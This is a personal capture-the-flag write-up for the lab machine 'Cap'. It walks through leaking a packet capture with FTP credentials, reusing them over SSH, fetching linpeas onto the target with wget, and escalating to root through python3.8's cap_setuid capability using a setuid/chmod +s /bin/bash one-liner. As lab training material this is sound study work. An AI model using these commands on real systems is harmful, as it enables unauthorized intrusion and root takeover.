# Cap (Linux)

# nmap 
21
22
80

# http (port 80)
I cam across a Security Dashboard with the user **Nathan** logged in. There was nothing on the main page. 
On the left sidebar I was able to access a page called **Security snapshot (5 second PCAP + Analysis)**.
Data Type                Value
Number of Packets       	0
Number of IP Packets    	0
Number of TCP Packets     0
Number of UDP Packet    	0

Download button; downloaded a PCAP file but was empty using **WireShark** assuming because are values are all 0's above.

Decided to run **feroxbuster** on the current **data**directory to see if there was anything hidden within this data. 
`feroxbuster -u http://10.10.10.245/data/ `

Results:
200      GET      371l      993w    17144c http://10.10.10.245/data/1
404      GET        4l       34w      232c http://10.10.10.245/data/download/0
200      GET      371l      993w    17147c http://10.10.10.245/data/0
200      GET      371l      993w    17144c http://10.10.10.245/data/01
200      GET      371l      993w    17147c http://10.10.10.245/data/00
200      GET      371l      993w    17147c http://10.10.10.245/data/000
200      GET      371l      993w    17144c http://10.10.10.245/data/001
200      GET      371l      993w    17147c http://10.10.10.245/data/0000
200      GET      371l      993w    17144c http://10.10.10.245/data/0001

I headed over to **/data/0** and found the same page as before but this time there was actually values and not just zeros. 

In **WireShark** I am able to see that there is a good amount of **Request** being sent in **FTP**. 
I even found a **user** and **password** that was used to login. 

# FTP 
Used the new credentails I found in **WireShark** to login using **FTP**. 
I listed the directories and used `get user.txt`. To download our and `cat` the first flag. 

# SSH
Used the same credentails for **SSH** and it worked. 
`sudo -l` was not allowed for **nathan**. 
Looked for anything that was useful. 
Headed to `cd /` and looked around. In **/var/www/html** I found **app.py** and was able to notice some things from the **Python** code. 

From here I decided to do a quick **./linpeas.sh** run. 
First: In the **linpeas.sh** directroy host a server `python -m http.server 8888`. (On my/your local machine)
Second: In the **users** machine (the target), `wget http://ip:port/linpeas.sh`.

Now I can use **linpeas.sh** in the target's machine. 

### Linpeas 
In **Capabilities** I was able to find: 
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip 

```bash
nathan@cap:/tmp/cap$ ls -al /usr/bin | grep python3
lrwxrwxrwx  1 root   root          23 Jan 27  2021 pdb3.8 -> ../lib/python3.8/pdb.py
lrwxrwxrwx  1 root   root          31 Mar 13  2020 py3versions -> ../share/python3/py3versions.py
lrwxrwxrwx  1 root   root           9 Mar 13  2020 python3 -> python3.8
lrwxrwxrwx  1 root   root          16 Mar 13  2020 python3-config -> python3.8-config
-rwxr-xr-x  1 root   root     5486384 Jan 27  2021 python3.8
lrwxrwxrwx  1 root   root          33 Jan 27  2021 python3.8-config -> x86_64-linux-gnu-python3.8-config
lrwxrwxrwx  1 root   root          33 Mar 13  2020 x86_64-linux-gnu-python3-config -> x86_64-linux-gnu-python3.8-config
-rwxr-xr-x  1 root   root        3240 Jan 27  2021 x86_64-linux-gnu-python3.8-config

```
**TL;DR:**
- All the `python3` stuff points to **Python 3.8**.
- `python3` is just a shortcut to `python3.8`.
- Other files like `*-config` and `pdb3.8` are helpers for development/debugging.
- They're all **owned by root** (user and group), which is standard for system-wide binaries.

Going back to what I found in **/var/www/html/app.py**:
I picked up and thought of the same thing; `python3 -c 'import os; os.setuid(0); os.system("chmod +s /bin/bash")'`

Alright, here’s what **I** just did with that command, especially knowing from earlier that everything Python-related is owned by root:

```bash
python3 -c 'import os; os.setuid(0); os.system("chmod +s /bin/bash")'
```

### Step-by-step in my own words:

1. **`python3 -c`**
   I ran a short Python script directly from the command line.

2. **`import os; os.setuid(0)`**
   I told Python to switch the **user ID to 0**, which is **root**.
   That means: if Python was running with root privileges, now my script is also running as root.

3. **`os.system("chmod +s /bin/bash")`**
   Then I used `os.system()` to run a shell command as root:
   `chmod +s /bin/bash` sets the **SUID bit** on `/bin/bash`.

   That means: anytime someone runs `/bin/bash`, it now runs **with root privileges**, even if they’re not root.

---

### Why did I do this?

Because `/usr/bin/python3` is owned by root (as I saw earlier), **if** I somehow got it to run with elevated privileges (e.g., via a SUID binary or some privilege escalation vector), I could abuse it to do dangerous things — like turning `/bin/bash` into a root shell.

So this command is part of a **privilege escalation technique**. After this, I could just run:
```bash
/bin/bash -p
whoami
cd /root
cat root.txt
```

PWNED!

# **Summary (in my words):**

I started by scanning the box and found that ports 21, 22, and 80 were open. When I visited the web page on port 80, I saw a Security Dashboard already logged in as the user Nathan. There wasn’t much at first, but I found a page called “Security Snapshot” that let me download 5-second PCAP files. The first one had all zeros, so I figured there had to be more behind the scenes.

I ran feroxbuster on the `/data/` directory and found several hidden pages like `/data/0`, `/data/01`, and so on. When I downloaded one of the captures that had actual data and opened it in Wireshark, I found FTP credentials in plaintext.

Using those creds, I logged into FTP and pulled the user flag. Then I tried SSH with the same credentials—it worked, and I was in as Nathan. I tried `sudo -l` but couldn’t run anything as root, so I started hunting for escalation paths.

I checked around and found an `app.py` script under `/var/www/html/`, which hinted Python was being used. I uploaded and ran linpeas.sh to speed up the enumeration process. It flagged `/usr/bin/python3.8` as having the capability `cap_setuid`, which basically meant it could change its user ID and potentially run as root.

That was my way in.

I ran a Python one-liner to set my UID to 0 and then gave `/bin/bash` the SUID bit. After that, I launched `/bin/bash -p`, which let me keep those root privileges. That gave me full access, including the root flag.

## **Key takeaways for myself:**

- Packet captures can leak credentials—especially FTP.
- Tools like linpeas are essential for finding privilege escalation vectors quickly.
- If a binary like Python has the `cap_setuid` capability, I can abuse it to become root.
- Setting the SUID bit on a shell can give me persistent root access.
- `/bin/bash -p` lets me keep elevated privileges if the binary has SUID.

## **Things I’ll remember:**

- Check for file capabilities, not just SUID bits.
- Analyze PCAPs deeply with Wireshark, especially when they're linked to real-time network captures.
- App source code under `/var/www/html` often reveals useful context or logic.
- Don’t give up if `sudo` is restricted—escalation paths can still exist through misconfigured capabilities.
